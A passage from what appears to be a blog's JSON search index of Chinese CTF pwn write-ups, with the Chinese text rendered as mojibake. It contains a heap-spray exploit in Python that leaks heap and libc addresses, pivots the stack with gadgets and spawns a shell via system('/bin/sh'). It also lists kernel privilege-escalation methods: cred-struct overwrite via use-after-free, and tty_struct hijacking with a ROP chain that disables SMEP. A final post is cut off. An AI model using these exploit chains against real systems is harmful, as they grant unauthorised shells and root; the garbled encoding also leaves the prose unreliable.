†å†…å®¹éƒ½ä¸ºmagic_addrï¼Œæ‰“å°å†…å®¹ä¹‹åï¼Œå°±å¯ä»¥ä¾æ®æ‰“å°çš„å†…å®¹ï¼Œèƒ½å¤Ÿä»ä¸­ç­›é€‰å‡ºmagic_addrï¼Œè·å–å…¶ç´¢å¼•ï¼Œå†ç»è¿‡æˆ‘ä»¬åˆ¶é€ å †å–·è¿‡ç¨‹ä¸­è¿ç®—å°±èƒ½å¾—åˆ°å¼€å§‹å †å–·çš„åœ°å€start_addrã€‚\n\næ¯”å¦‚ï¼šmagic_addr = 0x58585858ï¼Œç”³è¯·äº†0x100ä¸ª0x20000å¤§å°çš„Chunkï¼Œé‚£ä¹ˆå¾—åˆ°ç´¢å¼•ä¸º0x58ï¼Œä¸”magic_addr ä¹Ÿæ˜¯ä¸€ä¸ª0x20000çš„chunkï¼Œå°±å¯æ±‚å¾—start_addrä¸º0x58585858-0x58*0x20000ã€‚å½“ç„¶è¿™æ˜¯ç†è®ºä¸Šçš„ï¼Œå®é™…è¿˜å¾—ä¸€ç³»åˆ—çš„åˆ¤æ–­è¿ç®—ã€‚\n\nåŒç†ï¼Œåœ¨å½“æˆ‘ä»¬é‡Šæ”¾å †å—è¿›å…¥unsortedbinä¹‹åï¼Œè¸©ä¸‹main_arenaåœ°å€å†ç”³è¯·å›æ¥ï¼Œç”±äº\\x00æˆªæ–­å¾ˆéš¾æ³„éœ²å‡ºåœ°å€ï¼Œè¿™é‡Œä¹Ÿæ˜¯é‡‡ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½¿å¾—\\x00-1æˆä¸º0xffæ¥æŠŠ\\x00æˆªæ–­ç»™æŠ¹æ€ã€‚\n\n### (2)getshellåŸç†\n\næœ‰äº†åœ°å€ä¹‹åå°±å¯è°ƒç”¨libcä¸Šä»»æ„çš„å‡½æ•°äº†ï¼Œè¿™é‡Œçš„one_gadgetéƒ½ç”¨ä¸äº†ï¼Œåœ¨æ²¡åŠæ³•å¾€æ ˆä¸Šè¾“å…¥æ•°æ®çš„æƒ…å†µä¸‹å°±éœ€è¦æ ˆåŠ«æŒäº†ï¼Œè¿™é‡Œæ‰¾ä¸¤ä¸ªgadgetï¼ŒåŸé¢˜ç»™çš„æ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]\nmagic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\næˆ‘ç”¨æˆ‘è‡ªå·±ç¼–è¯‘çš„Libcæ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00164401# 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]\nmagic_gadget2 = 0x00073c10+0x3a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\nä¸€æ ·çš„ï¼Œæ²¡å•¥åŒºåˆ«ï¼Œå¾—è‡ªå·±æ‰¾å»ã€‚ROPgadgetã€‚\n\nåœ¨è°ƒç”¨`jmp *(*(chunk_addr+size))+0x4`æ—¶ï¼Œçœ‹åˆ°contextä¸º\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png)\n\nè¿™é‡Œçš„ecxå°±ä¿å­˜è¿™ä¸€ä¸ªå †åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨ecxå’Œeaxç»“åˆè¿™ä¸¤ä¸ªgdagetæ¥è¿›è¡Œæ ˆåŠ«æŒï¼Œä»è€Œgetshellã€‚\n\n## 3.expç¼–å†™ï¼š\n\n### (1)å †å–·å †å¸ƒå±€\n\nå¡«å……æ•°æ®åœ¨å †ä¸Šï¼Œæ»¡è¶³`*magic_addr=magic_addr`ï¼Œä¸”å…¶ä»–chunkçš„æ‰€æœ‰æ•°æ®ä¹Ÿä¸ºmagic_addr\n\n```python\n#æ³¨é‡Šå¤´\n\n#----------------------------------------\n#fill 0x58 to all chunk\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x20000 - 1), 1])\nmalloc(0x20000, data)\ndelete()\n\nfor i in range(0x10):\n    malloc(0x20000, data)\n\n#idx 0x0->0x100-1\n#----------------------------------------\n```\n\n### (2)å¡«å……éœ€è¦è§¦å‘çš„chunkæ•°æ®\n\næ»¡è¶³`*chunk_addr + size = magic_addr`ï¼Œç„¶åè°ƒç”¨callfucå‡½æ•°ä½¿å¾—`*magic_addr= magic_addr-1`ï¼Œæ‰“å°æ•°æ®ä¹‹åå³å¯åˆ¤æ–­ã€‚\n\n```python\n#-----------------------------------------------\n#fill 0x1000 all 0x58 (idx 0x100->0x110-1)\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x1000 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\n\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0xf0 - 1), 0])\nmalloc(0xf0, data)\n#idx 0x100->0x110-1\n\n\n#0x100->0x110-1 OK\ncallfuc(0x100)\nshow(0, 0x100)\n#-----------------------------------------------\n```\n\n### (3)åˆ¤æ–­chunkåŸºäºçš„BigChunkç´¢å¼•ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nindex = 0\noffest = 0\nout = ''\nmagic_addr = 0x58585858\nfor i in range(0x100):\n    out = p.recvline()\n    if 'W' in out:\n        index = i\n        break\nout = out[12 : ]\noffest = out.index('W')\n\nlog.info('magic_addr is : %d' % index)\nlog.info('offest is : %d' % offest)\nlog.info('start addr is : ' + hex(magic_addr- offest))\nblock_start = (index / 0x10) * 0x10\n```\n\n### (4)è®¡ç®—chunkåœ¨BigChunkä¸­çš„ä½ç½®ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndelete()\ncount = 1\np_index = 0\nwhile 1:\n    log.info(\"start find prev block count = %d\" % count)\n    data = []\n    for i in range(0x10):\n        data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),\n1])\n    malloc(0x1000, data)\n    delete()\n\n    data = []\n    for i in range(0x10):\n        data.append(['X' * (0xa0 - 1), 0])\n    malloc(0xa0, data)\n\n    log.info(\"start call fuc count = %d\" % count)\n    callfuc(0x100)\n    show(block_start - 0x10, index + 1)\n    p_index = 0\n    out = ''\n    for i in range(index + 1 - block_start + 0x10):\n        out = p.recvline()\n        if 'W' in out:\n            p_index = i + block_start - 0x10\n            break\n    delete()\n    if p_index < block_start:\n        break\n    count += 1\n\n\nlog.info('block start is : %d' % block_start)\nlog.info('p_index is : %d' % p_index)\nheap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8\nlog.info('heap start is : ' + hex(heap_start_addr))\n```\n\nåŒæ ·çš„æ–¹æ³•ï¼Œä¾æ®åœ°å€é¡ºåºéå†BigChunkä¸­çš„0x1-0x10çš„æ‰€æœ‰å¯èƒ½èŒƒå›´ï¼Œå¯¹äºä¿®æ”¹*chunk_addr= magic_addr-1ï¼Œç„¶åæ‰“å°åˆ¤æ–­å¾—åˆ°å„ä¸ªç´¢å¼•å¯¹åº”çš„åœ°å€ã€‚ç”±äºåˆ›å»ºçš„æ—¶å€™æ˜¯randomå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼è§£å†³ï¼Œæ¦‚ç‡ä¸º1/16ã€‚\n\n### (5)è·å–libcåœ°å€\n\næ–¹æ³•æ˜¯é‡Šæ”¾ä¹‹åä½¿ä¹‹è¿›å…¥unsortedbinè¸©ä¸‹åœ°å€ï¼Œåˆ©ç”¨callfucå‡½æ•°å’Œå­—èŠ‚é”™ä½çš„æ–¹æ³•å¯¹æŠ—\\x00æˆªæ–­ä»è€Œæ³„éœ²å‡ºåœ°å€ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfor i in range(0x10):\n    delete()\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append(['aaa', 0])\nmalloc(0xa0, data)\ncallfuc(0)\nshow(0, 0x10)\nfor i in range(index + 1 - block_start + 0x10):\n    out = p.recvline()\n    out = out[12 : -1]\n    if 'aaa' != out:\n        libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0\n        break\nlog.info('libc addr is : ' + hex(libc_addr))\ndelete()\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\nè¿™é‡Œçš„main_arenaå˜åŒ–æ˜¯å› ä¸º0xedb7ab000å˜ä¸ºäº†0xedb7afffï¼Œå¯¼è‡´å­—èŠ‚é”™ä½å˜åŒ–çš„ï¼Œå…·ä½“è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“\n\n### (6)åŠ«æŒæ ˆ\n\nç»“åˆgadgetæ¥getshellã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00164401       \n#xchg eax, ecx ; cli ; jmp dword ptr[eax] \nmagic_gadget2 = 0x00073c10+0x3a  \n#xchg eax, esp ; sal bh, 0xd8 ;\nsystem_offest = 0x3adb0\nbinsh_addr = 0x15bb0b\n# gdb.attach(p)\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr\n+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +\np32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\\x00'), 0])\nmalloc(0xa0, data)\ncallfuc(0)\np.interactive()\n```\n\nè¿™é‡Œå…³äºæœ€åå †ä¸Šæ•°æ®çš„å¸ƒå±€éœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œå»ºè®®å…ˆéšä¾¿å†™å‡ ä¸ªï¼Œç„¶åè°ƒè¯•çš„æ—¶å€™åœ¨å†™æ•°æ®ã€‚\n\nâ–²é¢˜å¤–è¯ï¼šè¿™é‡Œå…¶å®å¹¶æ²¡æœ‰ç”¨åˆ°å¸¸è§„æ„ä¹‰ä¸Šçš„é€šè¿‡å †å–·æ»‘æ¿0x0cï¼Œ0x58ä¹‹ç±»çš„æ»‘æ¿æŒ‡ä»¤æ¥æ‰§è¡Œshellcodeæˆ–è€…ROPï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œçš„magic_addræ¢æˆ0x57575757ï¼Œ0x56565656ä¹Ÿæ˜¯ä¸€æ ·å¯ä»¥çš„ï¼Œåªä¸è¿‡æˆåŠŸç‡å¯èƒ½ä¼šå°ä¸å°‘ï¼Œæ¯•ç«Ÿè¿™é‡Œè¿˜æœ€å¼€å§‹ç”³è¯·äº†ä¸€ä¸ªéšæœºå¤§å°çš„å †å—ï¼Œè€Œä¸”PIEå †çš„éšæœºåŒ–ç¨‹åº¦ä¹Ÿå¤§å¤šåœ¨0x56åˆ°0x58ä¹‹é—´ã€‚\n\n## 4.æ€»ç»“ï¼š\n\n- å †å–·æ€æƒ³ï¼šå…¶å®å°±æ˜¯å¤šçº§æŒ‡é’ˆçš„æ€æƒ³ï¼Œé€šè¿‡åŠ«æŒæŒ‡é’ˆæ¥æ»‘åŠ¨ç¨‹åºæµæˆ–è€…æ³„éœ²åœ°å€ã€‚\n\n- è°ƒè¯•ï¼šæ±‡ç¼–æŒ‡ä»¤ä¸€å®šè¦ç†Ÿæ‚‰ï¼ŒåƒåŠ«æŒæ ˆå¸¸ç”¨çš„xchg eax,espç­‰ã€‚","tags":["Heap-spray"],"categories":["PWN","pwnå †-spray"]},{"title":"pwn-kernel_å¸¸è§ææƒæ‰‹æ®µ","url":"/2021/08/18/pwn-kernel_å¸¸è§ææƒæ‰‹æ®µ/","content":"\nä¸€ã€åˆ©ç”¨credç»“æ„ä½“ææƒï¼š\n\n1.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)kernelä¸­ä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºä¸€ä¸ªcredç»“æ„ä½“ï¼Œä¿å­˜äº†è¯¥è¿›ç¨‹çš„æƒé™ç­‰ä¿¡æ¯å¦‚ï¼ˆuidï¼Œgidï¼‰ç­‰ï¼Œå¦‚æœèƒ½ä¿®æ”¹è¿™ä¸ªç»“æ„ä½“é‚£ä¹ˆå°±ä¿®æ”¹äº†è¿™ä¸ªè¿›ç¨‹çš„æƒé™ã€‚\n\n(2)ä¿®æ”¹è¿›ç¨‹çš„æƒé™ä¸ºrootä¹‹åï¼Œå†é€šè¿‡è¯¥è¿›ç¨‹å¼€çš„shellé‚£ä¹ˆä¹Ÿå°±æ˜¯rootæƒé™äº†ï¼Œå®ç°ææƒã€‚\n\n2.åˆ©ç”¨æ‰‹æ®µï¼š\n\n(1)é€šè¿‡UAFï¼Œå°†ä¸€å—å·²ç»é‡Šæ”¾çš„å †å—ä¿®æ”¹å¤§å°ä¸ºcredç»“æ„ä½“å¤§å°ï¼Œç„¶ååˆ›å»ºè¿›ç¨‹ï¼Œå°±ä¼šå°†è¯¥å †å—ç”³è¯·ä¸ºcredç»“æ„ä½“ã€‚\n\n(2)å†é€šè¿‡UAFå°†è¯¥credç»“æ„ä½“ä¸­çš„uidã€gidæ”¹æ‰ï¼Œå®ç°è¿›ç¨‹ææƒã€‚\n\nâ–²é‚£ä¹ˆå¦‚ä½•çŸ¥é“credç»“æ„ä½“çš„å¤§å°å‘¢ï¼Œä¸åŒlinuxå†…æ ¸ç‰ˆæœ¬çš„credç»“æ„ä½“å¤§å°ä¸åŒï¼š\n\nâ‘ é€šè¿‡linuxå†…æ ¸ç‰ˆæœ¬ï¼Œä¸Šæºç æŸ¥çœ‹ç½‘å€ï¼ŒæŸ¥æ‰¾å¯¹åº”çš„credç»“æ„ä½“ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458125.jpeg)\n\nè®¿é—®å¯¹åº”ç‰ˆæœ¬ï¼šhttps://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h\n\nå¯ä»¥çœ‹åˆ°æŸå†…æ ¸çš„credç»“æ„ä½“å¤§å°ï¼Œè¿™é‡Œæ˜¯0xa8ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nstruct cred {\n    atomic_t usage; 0x4\n    #ifdef CONFIG_DEBUG_CREDENTIALS debugé€‰é¡¹å»æ‰\n    atomic_t subscribers; /* number of processes subscribed */\n    void *put_addr;\n    unsigned magic;\n    #define CRED_MAGIC 0x43736564\n    #define CRED_MAGIC_DEAD 0x44656144\n    #endif\n    kuid_t uid; /* real UID of the task */ 0x4\n    kgid_t gid; /* real GID of the task */ 0x4\n    kuid_t suid; /* saved UID of the task */ 0x4\n    kgid_t sgid; /* saved GID of the task */ 0x4\n    kuid_t euid; /* effective UID of the task */ 0x4\n    kgid_t egid; /* effective GID of the task */ 0x4\n    kuid_t fsuid; /* UID for VFS ops */ 0x4\n    kgid_t fsgid; /* GID for VFS ops */ 0x4\n    unsigned securebits; /* SUID-less security management */ 0x4\n    kernel_cap_t cap_inheritable; /* caps our children can inherit */ 0x8\n    kernel_cap_t cap_permitted; /* caps we're permitted */ 0x8\n    kernel_cap_t cap_effective; /* caps we can actually use */ 0x8\n    kernel_cap_t cap_bset; /* capability bounding set */ 0x8\n    kernel_cap_t cap_ambient; /* Ambient capability set */ 0x8\n    #ifdef CONFIG_KEYS\n    unsigned char jit_keyring; /* default keyring to attach requested 0x8\n    * keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */ 0x8\n    struct key *process_keyring; /* keyring private to this process */ 0x8\n    struct key *thread_keyring; /* keyring private to this thread */ 0x8\n    struct key *request_key_auth; /* assumed request_key authority */ 0x8\n    #endif\n    #ifdef CONFIG_SECURITY\n    void *security; /* subjective LSM security */ 0x8\n    #endif\n    struct user_struct *user; /* real user ID subscription */ 0x8\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ 0x8\n    struct group_info *group_info; /* supplementary groups for euid/fsgid */ 0x8\n    struct rcu_head rcu; /* RCU deletion hook */ 0x10\n};\n```\n\nè¿™é‡Œå¤§å°æ˜¯å»æ‰debugéƒ¨åˆ†çš„æˆå‘˜çš„å¤§å°ï¼Œå› ä¸ºé¢˜ç›®ç»™çš„bzImageå†…æ ¸æ–‡ä»¶ä¸€èˆ¬éƒ½ä¸åŒ…å«debugé€‰é¡¹ï¼ŒåŒ…å«çš„è¯ä¼šç‰¹åˆ«å¤§ï¼Œè¿™é‡Œåé¢æ ‡æ³¨çš„å¤§å°æ˜¯æŸä¸ªå¤§ä½¬æ ‡æ³¨ï¼š\n\nhttps://www.jianshu.com/p/a465b3f6d7cb\n\nâ‘¡ç›´æ¥è‡ªå·±å†™ä¸€ä¸ªå°moduleåŠ è½½æ‰“å°credç»“æ„ä½“å¤§å°ï¼š\n\n```\n//ç®€å•modules\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/cred.h>\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstruct cred c1;\nstatic int hello_init(void)\n{\n    printk(\"<1> Hello world!\\n\");\n    printk(\"size of cred : %d \\n\",sizeof(c1));\n    return 0;\n}\nstatic void hello_exit(void)\n{\n    printk(\"<1> Bye, cruel world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nA.æ–°å»ºä¸€ä¸ªhelloæ–‡ä»¶å¤¹ï¼Œæ”¾ä¸Šè¿°ä»£ç hello.cå’ŒMakefileï¼Œè®¾ç½®Makefileä¸ºï¼š\n\n```\nobj-m := hello.o\n\nKERNELDR := /usr/src/linux-headers-4.15.0-22-generic\n\nPWD := $(shell pwd)\n\nmodules:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules\n\nmoduels_install:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install\n\nclean:\nrm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions\n```\n\nè¿™é‡Œçš„KERNELDRç›®å½•æ˜¯ç¼–è¯‘ä¹‹åçš„kernelç›®å½•\n\nmakeå‘½ä»¤ç¼–è¯‘ä¸‹è¿™ä¸ªhello.cï¼Œä¼šç”Ÿæˆå‡ ä¸ªæ–‡ä»¶ï¼Œåªéœ€è¦hello.ko\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458099.jpeg)\n\nB.åœ¨æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­vim initï¼Œè®¾ç½®ä¸€ä¸‹ï¼ŒåŠ ä¸Šinsmod /hello.koï¼Œå†é‡æ–°æ‰“åŒ…ï¼Œé€šè¿‡qemuå¯åŠ¨å†…æ ¸ï¼Œå¯åŠ¨å‘½ä»¤ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr\" \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nè¿™é‡Œä¸èƒ½åœ¨appendä¸­æ·»åŠ quietå‘½ä»¤ï¼Œå¦åˆ™æ²¡æ³•æ‰“å°å‡ºæ¥\n\nC.ä¹‹åå°±å¯ä»¥çœ‹åˆ°\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458400.jpeg)\n\nå‚ç…§ï¼š[https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/](https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-åˆæ¢-1/)\n\n(3)ä¸€èˆ¬è€Œè¨€ï¼Œä¿®æ”¹credç»“æ„ä½“å¯ä»¥ç›´æ¥ä»å¤´å¼€å§‹ï¼Œå°†å¤´éƒ¨è‡³gidçš„éƒ¨åˆ†éƒ½èµ‹å€¼ä¸º0å³å¯ï¼Œå› ä¸ºå‰é¢çš„æ•°æ®åŸºæœ¬ç”¨ä¸åˆ°ï¼Œä¸éœ€è¦å†å»æ‰¾åŸå§‹æ•°æ®æ¥èµ‹å€¼ã€‚\n\näºŒã€åˆ©ç”¨ptmxè®¾å¤‡ä¸­çš„tty_structç»“æ„ä½“\n\n1.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)æ‰“å¼€è®¾å¤‡ï¼Œopen(\"/dev/ptmx\", O_RDWR)æ—¶ä¼šåˆ›å»ºä¸€ä¸ªtty_struct\n\n(2)tty_structç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªconst struct tty_operations *ops;ç»“æ„ä½“æŒ‡é’ˆï¼Œåç§»ä¸ºxxã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\nç»“æ„ä½“å¤§å°ä¸º0x2e0ï¼Œä½†æ˜¯ä¸çŸ¥é“å„ä¸ªç‰ˆæœ¬çš„å¤§å°æ˜¯ä¸æ˜¯éƒ½ä¸€æ ·ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹å¤§å°ï¼Œä»ç„¶å¯ä»¥ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œå»ç½‘ç«™ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå°module\n\nç½‘ç«™ï¼šhttps://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h\n\nmoduleï¼šå‚ç…§ä¸Šé¢çš„ï¼Œæ‰“å°å³å¯ã€‚\n\n(3)tty_operationsç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªint (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); å‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä¸ptmxè®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œè°ƒç”¨writeå‡½æ•°æ—¶å°±ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\nè¿™ä¸ªç»“æ„ä½“åœ¨ä¼ªé€ çš„æ—¶å€™å°±å¯ä»¥éšä¾¿ä¼ªé€ äº†ï¼Œåªè¦å‡½æ•°åç§»ä½ç½®å¯¹å°±è¡Œã€‚\n\n(4)æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªtty_structç»“æ„ä½“fake_tty_1ï¼Œåˆ©ç”¨UAFæ¼æ´å°†ä¸€ä¸ªå †å—ç”³è¯·ä¸ºè¿™ä¸ªç»“æ„ä½“ï¼Œä¿®æ”¹å…¶const struct tty_operations *ops;ç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘å¦ä¸€ä¸ªä¼ªé€ çš„tty_operationsç»“æ„ä½“fake_tty_2ã€‚\n\n(5)å°†tty_operationsç»“æ„ä½“fake_tty_2ä¸­çš„int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); å‡½æ•°æŒ‡é’ˆæŒ‡å‘ROPé“¾ï¼Œè°ƒç”¨ROPï¼Œæ§åˆ¶ç¨‹åºã€‚\n\n(6)æ§åˆ¶ç¨‹åºä¹‹åä¸€èˆ¬éœ€è¦å…³é—­æ‰smepä¿æŠ¤ï¼Œä¹‹åç”¨ret2Usræ¥ææƒã€‚\n\nâ–²å…³é—­smepä¿æŠ¤ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458313.jpeg)\n\néœ€è¦å°†CR4å¯„å­˜å™¨ä¸­çš„ç¬¬20ä½ç½®0ï¼Œå³å¯å…³é—­ã€‚ä¸€èˆ¬åœ¨ROPé“¾ä¸­æ‰§è¡Œä¸‹åˆ—gadgetå³å¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov cr4,0x6f0; ret;\n----------------------------------------------------------------------\npop rdi; ret\n0x6f0\nmov cr4,rdi; ret;\n```\n\nä¸Šé¢ä¸¤ç§éƒ½è¡Œï¼Œæˆ–è€…å…¶å®ƒæ»¡è¶³æ¡ä»¶çš„gadgetä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œ0x6f0æ˜¯æƒ³ç»•è¿‡ä¸€äº›æœºåˆ¶ã€‚\n\n2.åˆ©ç”¨æ‰‹æ®µï¼š\n\n(1)é€šè¿‡UAFç”³è¯·å¾—åˆ°tty_structç»“æ„ä½“æŒ‡é’ˆï¼Œä¿®æ”¹const struct tty_operations *opsä½¿å…¶æŒ‡å‘ç”¨æˆ·ç©ºé—´ä¼ªé€ çš„tty_operationsç»“æ„ä½“ï¼Œä¼ªé€ çš„tty_operationsç»“æ„ä½“ä¸­çš„writeæŒ‡é’ˆæŒ‡å‘ROPé“¾ã€‚\n\n(2)ROPé“¾è¿›è¡Œè¿ç§»å†…æ ¸æ ˆï¼Œå…³é—­smepä¿æŠ¤ï¼Œæ­£å¸¸ret2Usrã€‚\n\n ","tags":["kernel-skill"],"categories":["pwn-kernel"]},{"title":"0CTF2018-baby(double-fetch)","url":"/2021/08/14/0CTF2018-baby(double-fetch)/","content":"\nåªç»™äº†baby.koå’ŒåŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿcore.cpioï¼Œæ²¡æœ‰å†…æ ¸å’Œå¯åŠ¨è„šæœ¬ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½å’Œé…ç½®ã€‚\n\n1.ä¸‹è½½å†…æ 